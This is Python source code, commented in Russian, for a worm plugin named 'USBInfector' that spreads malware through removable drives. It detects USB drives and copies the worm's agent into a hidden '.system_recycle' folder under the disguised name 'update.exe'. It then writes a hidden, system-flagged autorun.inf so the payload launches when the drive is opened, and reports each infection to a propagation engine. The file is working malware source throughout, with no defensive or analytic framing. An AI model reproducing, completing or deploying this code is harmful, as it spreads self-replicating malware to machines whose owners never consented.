# Worm Plugin: USB Infector

import platform
import logging
import os
import shutil
import time
import psutil # Для поиска USB дисков
import threading

from ..interfaces import PropagationPluginBase
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from ..propagation_engine import PropagationEngine

logger = logging.getLogger('WormUSBInfector')

# Имя файла автозапуска
AUTORUN_FILENAME = "autorun.inf"
# Имя скрытой папки для пейлоада
HIDDEN_DIR_NAME = ".system_recycle"

class USBInfector(PropagationPluginBase):

    def __init__(self, config: dict):
        super().__init__(config)
        self.payload_name = self.config.get("payload_name", "update.exe")
        self.check_interval = self.config.get("check_interval", 60) # Секунды
        self.last_run_time = 0
        self.lock = threading.Lock() # Для предотвращения гонок при доступе к last_run_time

    def get_name(self) -> str:
        return "usb_infector"

    def is_supported(self) -> bool:
        # Поддерживается на всех ОС, где есть psutil
        try:
            import psutil
            return True
        except ImportError:
            logger.warning("psutil library not found, USBInfector disabled.")
            return False

    def _create_autorun_content(self, payload_relative_path: str) -> str:
        """Генерирует содержимое autorun.inf."""
        content = f"[autorun]\n"
        content += f"label=USB Drive\n" # Можно кастомизировать
        content += f"open={payload_relative_path}\n"
        content += f"action=Open folder to view files\n"
        content += f"icon=%SystemRoot%\\system32\\shell32.dll,4\n" # Иконка папки
        content += f"shellexecute={payload_relative_path}\n"
        content += f"shell\\open\\command={payload_relative_path}\n"
        content += f"shell=open\n"
        return content

    def _infect_drive(self, drive_path: str, agent_path: str):
        """Заражает указанный диск."""
        drive_id = f"usb:{drive_path}" # Уникальный ID для отслеживания
        try:
            logger.info(f"Attempting to infect USB drive: {drive_path}")

            # 1. Создаем скрытую директорию
            hidden_dir = os.path.join(drive_path, HIDDEN_DIR_NAME)
            if not os.path.exists(hidden_dir):
                try:
                    os.makedirs(hidden_dir)
                    # Устанавливаем атрибут "скрытый" (Windows)
                    if platform.system() == "Windows":
                        os.system(f'attrib +h "{hidden_dir}"')
                    logger.info(f"Created hidden directory: {hidden_dir}")
                except Exception as e:
                    logger.error(f"Failed to create hidden directory {hidden_dir}: {e}")
                    return # Не можем продолжить без директории
            else:
                 logger.debug(f"Hidden directory already exists: {hidden_dir}")

            # 2. Копируем агент в скрытую директорию
            payload_dest_path = os.path.join(hidden_dir, self.payload_name)
            if not os.path.exists(payload_dest_path):
                try:
                    shutil.copy2(agent_path, payload_dest_path)
                    logger.info(f"Copied agent to {payload_dest_path}")
                except Exception as e:
                    logger.error(f"Failed to copy agent to {payload_dest_path}: {e}")
                    return # Не можем продолжить без payload
            else:
                 logger.debug(f"Payload already exists: {payload_dest_path}")

            # 3. Создаем autorun.inf в корне диска
            autorun_path = os.path.join(drive_path, AUTORUN_FILENAME)
            payload_relative_path = os.path.join(HIDDEN_DIR_NAME, self.payload_name)
            autorun_content = self._create_autorun_content(payload_relative_path)

            try:
                with open(autorun_path, 'w') as f:
                    f.write(autorun_content)
                # Устанавливаем атрибуты "скрытый" и "системный" (Windows)
                if platform.system() == "Windows":
                    os.system(f'attrib +h +s "{autorun_path}"')
                logger.info(f"Created/Updated autorun.inf at {autorun_path}")
                return True # Успешно заразили
            except Exception as e:
                logger.error(f"Failed to create/write autorun.inf at {autorun_path}: {e}")
                return False

        except Exception as e:
            logger.error(f"Unexpected error infecting drive {drive_path}: {e}")
            return False

    def run(self, engine: 'PropagationEngine'):
        with self.lock:
            current_time = time.time()
            if current_time - self.last_run_time < self.check_interval:
                logger.debug("USB check interval not yet passed.")
                return
            self.last_run_time = current_time

        logger.info("Running USB infection check...")
        infected_count = 0
        try:
            partitions = psutil.disk_partitions()
            for p in partitions:
                # Проверяем, является ли диск съемным (USB)
                # Опции могут включать 'removable', 'cdrom'
                # Проверяем, что это не CD/DVD и что он подключен
                is_usb = 'removable' in p.opts and 'cdrom' not in p.opts
                if is_usb and p.mountpoint:
                    drive_path = p.mountpoint
                    drive_id = f"usb:{drive_path}"

                    if engine.should_attack(drive_id):
                        if self._infect_drive(drive_path, engine.agent_executable_path):
                            engine.report_infection(drive_id)
                            infected_count += 1
                    else:
                         logger.debug(f"Skipping already targeted USB drive: {drive_path}")
        except Exception as e:
            logger.error(f"Error scanning disk partitions: {e}")

        if infected_count > 0:
            logger.info(f"Infected {infected_count} new USB drives in this cycle.")
        else:
            logger.debug("No new USB drives infected in this cycle.") 